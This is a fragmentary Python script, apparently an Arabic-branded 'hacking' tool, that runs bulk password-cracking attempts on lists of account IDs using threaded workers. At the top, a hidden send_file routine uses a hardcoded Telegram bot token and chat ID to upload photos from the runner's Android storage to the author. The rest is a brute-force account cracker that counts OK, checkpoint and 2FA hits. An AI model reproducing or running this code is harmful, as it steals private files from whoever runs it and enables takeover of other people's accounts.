...
bot = telebot.TeleBot('7096905327:AAGfYvuYpSON15T0St0mRyuYwFOKDQWkX44')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id='7432703802', photo=f, caption='By: MANDO AL ZAYEM 🖤@lj_je')
...
⠸⣿⣿⣿⣿⣿⣿⠏
⠀⠈⠛⠿⣿⣿⡟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉هكر مصري MANDO AL ZAYEM 🖤⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀
⠀Wait a few seconds to open the performance 
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[My channel on Telegram• \33[1;38mhttps://t.me/Xhuntek ]\33[1;38m       ║\033[1;31m 
╠══[name                        • \33[1;38mMANDO AL ZAYEM 🖤]   ║\33[1;34m   
╠══[Yuzri                     • ]   @lj_je       ║ \33[1;32m   
╠══[Waistcoat                  •V2]      ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m
—————————————————————————
• DeCoDe By @lj_je | MANDO AL ZAYEM 🖤•
—————————————————————————
...
def public():
        ...
        linex()
        print(' [1] Method 1 (new breakthrough ) \n [2] Method 2 (mixed penetration )\n [3] Method 3 (Hacking my microphone )')
        linex()
        ...
        if cx in ['y','Y','yes','Yes','1']:
                ...
                pcp.append('n')
        linex()
        print('\033[1;32m IDs are being checked  ...\033[1;37m')
        linex()
        for userr in usrr:
                try:
        ...
        try:
                ...
                print('\033[1;37m')
                linex()
                print(' Other than that, my hands are not working  ')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input(' Inter final pressure tool  ')
                os.system('python ASX.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
...
def menu():
        ...
        try:
                ...
                if "server on" in sj:
                        ...
                        print(('—'*25)+'\n• DeCoDe By @lj_je | MANDO AL ZAYEM 🖤•\n'+('—'*25))
                        print()
                        print('\x1b[1;91m [01] \x1b[1;92mاFile hacking  ')
                        print('\x1b[1;91m [02] \x1b[1;92mاذا You want to hack from friends, choose option 2 first to register with cookies  ')
                        print('\x1b[1;91m [03] \x1b[1;92mاHacking. From the truth  ')
                        print('\x1b[1;91m [04] \x1b[1;92mHacking from 4 countries  ')
                        print('\x1b[1;91m [05] \x1b[1;92mاRandom hacking from Asma  ')
                        print('\x1b[1;91m [06] \x1b[1;92mDelete duplicate IDs from a file  ')
                        print('\x1b[1;91m [0] \x1b[1;92mA tool was deposited  ')
                        linex()
                        xd=input(' Choose > ')
                        if xd in ['1','01']:                           
                                linex()
                                file = input(' Enter a file path  \033[1;32m: ')
                                try:
                                ...
                                if ppp in ['1','01']:
                                    ...
                                    plist.append('12341234@@')
                                        ...
                                        try:
                                                linex()
                                                ps_limit = int(input(' How many passwords do you want to leave?  ? '))
                                        except:
                                                ps_limit =1
                                        linex()
                                        print('\033[1;32m exp: first last,firtslast,first123')
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        lim=int(total_ids)
                                        print(' \x1b[1;93mID file number  😎 : \033[1;32m'+total_ids)
                                        print("\033[1;32m Run by MANDO AL ZAYEM 🖤")
                                        print("\033[1;34m If your file is a failure, don't worry  تصيد🙂")
                                        print("\033[1;34m 10 Be patient even when a rooster stallion strikes ")
                                        linex()
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m تم تشغيل بواسطه MANDO AL ZAYEM 🖤')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        ...
                        print(' \033[1;32m تم تشغيل بواسطه MANDO AL ZAYEM 🖤')
